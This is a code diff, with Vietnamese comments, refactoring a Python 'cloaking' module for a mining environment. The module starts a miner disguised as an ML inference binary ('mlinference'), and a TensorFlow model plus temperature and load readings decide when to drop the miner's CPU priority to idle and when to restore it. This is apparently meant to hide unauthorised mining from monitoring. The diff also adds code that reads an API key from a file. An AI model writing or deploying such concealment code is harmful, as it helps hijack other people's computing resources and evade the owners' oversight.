@@ -1,3 +1,5 @@
+# mining_environment/scripts/ai_environment_cloaking.py
+
 import os
 import subprocess
 import sys
@@ -11,32 +13,102 @@ import tensorflow as tf
 from tensorflow.keras import models
 from sklearn.preprocessing import MinMaxScaler
 from loguru import logger
+import joblib
+from pathlib import Path
+import json
 
 # ===== Cấu hình logging =====
-logger.remove()  # Loại bỏ các handler mặc định
-logger.add(
-    "/app/mining-environment/logs/cloaking_system.log",
-    rotation="10 MB",
-    retention="7 days",
-    compression="zip",
-    level="INFO",
-    enqueue=True,
-    backtrace=True,
-    diagnose=True
-)
+def configure_logging():
+    """
+    Cấu hình logging sử dụng loguru.
+    """
+    logger.remove()  # Loại bỏ các handler mặc định
+    
+    log_dir = Path("/app/mining_environment/logs")
+    log_dir.mkdir(parents=True, exist_ok=True)  # Đảm bảo thư mục logs tồn tại
+
+    logger.add(
+        log_dir / "cloaking_system.log",
+        rotation="10 MB",
+        retention="7 days",
+        compression="zip",
+        level="INFO",
+        enqueue=True,
+        backtrace=True,
+        diagnose=True
+    )
+    logger.add(
+        sys.stdout,
+        level="INFO",
+        format="{time} {level} {message}",
+        enqueue=True
+    )
 
 # ===== Cấu hình môi trường =====
-BASE_CONFIG_DIR = os.getenv("CONFIG_DIR", "/app/mining-environment/config")
-BASE_MODELS_DIR = os.getenv("MODELS_DIR", "/app/mining-environment/models")
-BASE_LOGS_DIR = os.getenv("LOGS_DIR", "/app/mining-environment/logs")
-BASE_RESOURCES_DIR = os.getenv("RESOURCES_DIR", "/app/mining-environment/resources")
-MINING_COMMAND = os.getenv("MINING_COMMAND", "/usr/local/bin/mlinference")
-MINING_CONFIG = os.getenv("MINING_CONFIG", "mlinference_config.json")
-CLOAKING_THRESHOLD = float(os.getenv("CLOAKING_THRESHOLD", "0.9"))
-CLOAKING_INTERVAL = int(os.getenv("CLOAKING_INTERVAL", "60"))  # Giây
+def load_json_config(file_path):
+    """
+    Tải cấu hình JSON từ file.
+    
+    :param file_path: Đường dẫn tới tệp JSON cấu hình.
+    :return: Dictionary chứa cấu hình hoặc {} nếu lỗi.
+    """
+    try:
+        with open(file_path, 'r') as file:
+            config = json.load(file)
+            logger.info(f"Tải cấu hình từ {file_path} thành công.")
+            return config
+    except FileNotFoundError:
+        logger.warning(f"Tệp cấu hình {file_path} không tồn tại.")
+    except json.JSONDecodeError as e:
+        logger.error(f"Lỗi khi giải mã JSON từ {file_path}: {e}")
+    except Exception as e:
+        logger.error(f"Không thể tải file cấu hình {file_path}: {e}")
+    return {}
+
+def set_env_variable(key, value, overwrite=False):
+    """
+    Thiết lập biến môi trường nếu biến chưa tồn tại hoặc cho phép ghi đè.
+    
+    :param key: Tên biến môi trường.
+    :param value: Giá trị của biến môi trường.
+    :param overwrite: Cho phép ghi đè giá trị nếu True.
+    """
+    current_value = os.getenv(key)
+    if overwrite or current_value is None:
+        os.environ[key] = value
+        if key.lower() == "api_key":
+            logger.info(f"Thiết lập biến môi trường: {key}=***")
+        else:
+            logger.info(f"Thiết lập biến môi trường: {key}=[REDACTED]")
+    else:
+        logger.info(f"Biến môi trường '{key}' đã tồn tại, giữ nguyên giá trị.")
+
+def read_encryption_key():
+    """
+    Đọc khóa API từ biến môi trường hoặc tệp bảo mật.
+    
+    :return: Khóa API dưới dạng string hoặc None nếu lỗi.
+    """
+    try:
+        api_key = os.getenv("API_KEY")
+        if api_key:
+            logger.info("Đọc API_KEY từ biến môi trường.")
+            return api_key
+        else:
+            api_key_path = Path(os.getenv("RESOURCES_DIR", "/app/mining_environment/resources")) / "encryption_keys" / "api_key.txt"
+            if api_key_path.exists():
+                with open(api_key_path, 'r') as key_file:
+                    api_key = key_file.read().strip()
+                    logger.info("Đọc API_KEY từ tệp thành công.")
+                    return api_key
+            else:
+                logger.warning(f"File {api_key_path} không tồn tại. Thiếu API_KEY trong môi trường.")
+    except Exception as e:
+        logger.error(f"Lỗi khi đọc khóa API: {e}")
+    return None
 
 class AIEnvironmentCloaking:
-    def __init__(self, cloaking_threshold=CLOAKING_THRESHOLD, interval=CLOAKING_INTERVAL):
+    def __init__(self, cloaking_threshold=0.9, interval=60):
         """
         Khởi tạo hệ thống cloaking với mô hình AI và ngưỡng cloaking.
 
@@ -65,8 +137,17 @@ class AIEnvironmentCloaking:
             tf.config.threading.set_inter_op_parallelism_threads(4)
             tf.config.optimizer.set_jit(True)
             # Đảm bảo TensorFlow chỉ sử dụng CPU
-            tf.config.set_visible_devices([], 'GPU')
-            logger.info("TensorFlow đã được cấu hình để sử dụng CPU với tối ưu hóa.")
+            gpus = tf.config.list_physical_devices('GPU')
+            if gpus:
+                try:
+                    for gpu in gpus:
+                        tf.config.experimental.set_memory_growth(gpu, True)
+                        tf.config.set_visible_devices([], 'GPU')
+                    logger.info("TensorFlow đã được cấu hình để sử dụng CPU với tối ưu hóa.")
+                except RuntimeError as e:
+                    logger.error(f"Lỗi khi cấu hình TensorFlow GPU: {e}")
+            else:
+                logger.info("Không tìm thấy GPU. TensorFlow sẽ sử dụng CPU.")
         except Exception as e:
             logger.error(f"Lỗi khi cấu hình TensorFlow: {e}")
 
@@ -76,7 +157,7 @@ class AIEnvironmentCloaking:
 
         :return: Mô hình đã tải
         """
-        model_path = os.getenv("CLOAKING_MODEL_PATH", os.path.join(BASE_MODELS_DIR, "cloaking_model.h5"))
+        model_path = os.getenv("CLOAKING_MODEL_PATH", os.path.join(os.getenv("MODELS_DIR", "/app/mining_environment/models"), "cloaking_model.h5"))
         try:
             model = models.load_model(model_path)
             logger.info(f"Mô hình AI đã được tải thành công từ {model_path}")
@@ -92,10 +173,9 @@ class AIEnvironmentCloaking:
         :return: Đối tượng MinMaxScaler đã được khởi tạo
         """
         scaler = MinMaxScaler()
-        scaler_path = os.path.join(BASE_MODELS_DIR, "scaler.pkl")
-        if os.path.exists(scaler_path):
+        scaler_path = Path(os.getenv("MODELS_DIR", "/app/mining_environment/models")) / "scaler.pkl"
+        if scaler_path.exists():
             try:
-                import joblib
                 scaler = joblib.load(scaler_path)
                 logger.info("MinMaxScaler đã được tải từ scaler.pkl.")
             except Exception as e:
@@ -176,7 +256,7 @@ class AIEnvironmentCloaking:
         """
         try:
             # Sử dụng sensors trên Linux
-            output = subprocess.check_output(['sensors']).decode()
+            output = subprocess.check_output(['sensors'], stderr=subprocess.STDOUT).decode()
             temps = [float(line.split()[1].replace('+', '').replace('°C', ''))
                      for line in output.splitlines() if 'temp' in line.lower()]
             return max(temps) if temps else 0.0
@@ -234,8 +314,7 @@ class AIEnvironmentCloaking:
                 self.scaler.fit([data])
                 logger.info("MinMaxScaler đã được fit với dữ liệu đầu vào.")
                 # Lưu scaler để sử dụng sau này
-                scaler_path = os.path.join(BASE_MODELS_DIR, "scaler.pkl")
-                import joblib
+                scaler_path = Path(os.getenv("MODELS_DIR", "/app/mining_environment/models")) / "scaler.pkl"
                 joblib.dump(self.scaler, scaler_path)
                 logger.info(f"MinMaxScaler đã được lưu tại {scaler_path}.")
             scaled_data = self.scaler.transform([data])[0]
@@ -297,7 +376,10 @@ class AIEnvironmentCloaking:
             mining_pid = self.get_mining_process_pid()
             if mining_pid:
                 process = psutil.Process(mining_pid)
-                process.nice(psutil.IDLE_PRIORITY_CLASS if hasattr(psutil, 'IDLE_PRIORITY_CLASS') else 19)
+                if hasattr(psutil, 'IDLE_PRIORITY_CLASS'):
+                    process.nice(psutil.IDLE_PRIORITY_CLASS)
+                else:
+                    process.nice(19)
                 logger.info(f"Giảm độ ưu tiên CPU của tiến trình {mining_pid}")
             else:
                 logger.warning("Không tìm thấy tiến trình khai thác để giảm tải CPU.")
@@ -312,7 +394,10 @@ class AIEnvironmentCloaking:
             mining_pid = self.get_mining_process_pid()
             if mining_pid:
                 process = psutil.Process(mining_pid)
-                process.nice(psutil.NORMAL_PRIORITY_CLASS if hasattr(psutil, 'NORMAL_PRIORITY_CLASS') else 0)
+                if hasattr(psutil, 'NORMAL_PRIORITY_CLASS'):
+                    process.nice(psutil.NORMAL_PRIORITY_CLASS)
+                else:
+                    process.nice(0)
                 logger.info(f"Khôi phục độ ưu tiên CPU của tiến trình {mining_pid}")
             else:
                 logger.warning("Không tìm thấy tiến trình khai thác để khôi phục tải CPU.")
@@ -358,8 +443,8 @@ class AIEnvironmentCloaking:
         if self.mining_process is None or self.mining_process.poll() is not None:
             try:
                 mining_command = [
-                    MINING_COMMAND,
-                    "--config", os.path.join(BASE_CONFIG_DIR, MINING_CONFIG)
+                    os.getenv("MINING_COMMAND", "/usr/local/bin/mlinference"),
+                    "--config", os.path.join(os.getenv("CONFIG_DIR", "/app/mining_environment/config"), os.getenv("MINING_CONFIG", "mlinference_config.json"))
                 ]
                 self.mining_process = subprocess.Popen(
                     mining_command,
@@ -438,20 +523,16 @@ class AIEnvironmentCloaking:
         except Exception as e:
             logger.error(f"Lỗi trong quá trình dọn dẹp: {e}")
 
-def initialize_cloaking():
+def run_cloaking():
+    configure_logging()  # Đảm bảo logging được cấu hình khi hàm run_cloaking() được gọi
     """
-    Hàm để khởi tạo và bắt đầu hệ thống cloaking.
+    Hàm để khởi tạo và chạy hệ thống cloaking.
     """
-    cloaking_system = AIEnvironmentCloaking()
+    cloaking_threshold = float(os.getenv("CLOAKING_THRESHOLD", "0.9"))
+    cloaking_interval = int(os.getenv("CLOAKING_INTERVAL", "60"))
+    cloaking_system = AIEnvironmentCloaking(cloaking_threshold, cloaking_interval)
     atexit.register(cloaking_system.cleanup)
     return cloaking_system
-
+    
 if __name__ == "__main__":
-    # Chỉ chạy khi tệp này được chạy trực tiếp, không phải khi import
-    cloaking_system = initialize_cloaking()
-    try:
-        while True:
-            time.sleep(1)
-    except (KeyboardInterrupt, SystemExit):
-        logger.info("Đã nhận tín hiệu dừng chương trình.")
-        cloaking_system.cleanup()
+    run_cloaking()
